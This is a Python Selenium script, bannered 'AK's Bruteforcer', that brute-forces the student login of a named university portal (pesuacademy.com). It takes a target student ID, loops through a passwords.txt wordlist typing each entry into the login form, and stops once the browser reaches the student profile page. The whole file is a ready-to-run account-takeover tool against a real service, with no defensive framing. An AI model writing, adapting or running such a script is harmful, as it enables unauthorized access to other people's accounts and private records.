from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

art = """

 _______  _        _  _______    ______   _______          _________ _______  _______  _______  _______  _______  _______  _______ 
(  ___  )| \    /\( )(  ____ \  (  ___ \ (  ____ )|\     /|\__   __/(  ____ \(  ____ \(  ___  )(  ____ )(  ____ \(  ____ \(  ____ )
| (   ) ||  \  / /|/ | (    \/  | (   ) )| (    )|| )   ( |   ) (   | (    \/| (    \/| (   ) || (    )|| (    \/| (    \/| (    )|
| (___) ||  (_/ /    | (_____   | (__/ / | (____)|| |   | |   | |   | (__    | (__    | |   | || (____)|| |      | (__    | (____)|
|  ___  ||   _ (     (_____  )  |  __ (  |     __)| |   | |   | |   |  __)   |  __)   | |   | ||     __)| |      |  __)   |     __)
| (   ) ||  ( \ \          ) |  | (  \ \ | (\ (   | |   | |   | |   | (      | (      | |   | || (\ (   | |      | (      | (\ (   
| )   ( ||  /  \ \   /\____) |  | )___) )| ) \ \__| (___) |   | |   | (____/\| )      | (___) || ) \ \__| (____/\| (____/\| ) \ \__
|/     \||_/    \/   \_______)  |/ \___/ |/   \__/(_______)   )_(   (_______/|/       (_______)|/   \__/(_______/(_______/|/   \__/
                                                                                                                                   

                                      """
print(art)

name = input("Enter the SRN : \n")


login_url = "https://www.pesuacademy.com/Academy/"  
password_file_path = "passwords.txt"     
name.strip()
driver = webdriver.Chrome()


driver.get(login_url)


with open(password_file_path, 'r') as file:
    passwords = file.readlines()

try:

   

    for password in passwords:
        username_field = driver.find_element(By.NAME, "j_username")
        username_field.send_keys(f"{name}") 
        password = password.strip()  
        password_field = driver.find_element(By.NAME, "j_password")
        password_field.clear()  
        password_field.send_keys(password)

        
        sign_in_button = driver.find_element(By.ID, "postloginform#/Academy/j_spring_security_check")

       
        WebDriverWait(driver, 1).until(
            EC.element_to_be_clickable((By.ID, "postloginform#/Academy/j_spring_security_check"))
        )

        sign_in_button.click()

        #change thiss
        time.sleep(0.01)

        
        current_url = driver.current_url
        if current_url == "https://www.pesuacademy.com/Academy/s/studentProfilePESU":
            print(f"URL changed to: {current_url}. Stopping the process.")
            time.sleep(50000)
            break
except KeyboardInterrupt as e:
   print("Exiting")
   exit(0)
finally:

    driver.quit()
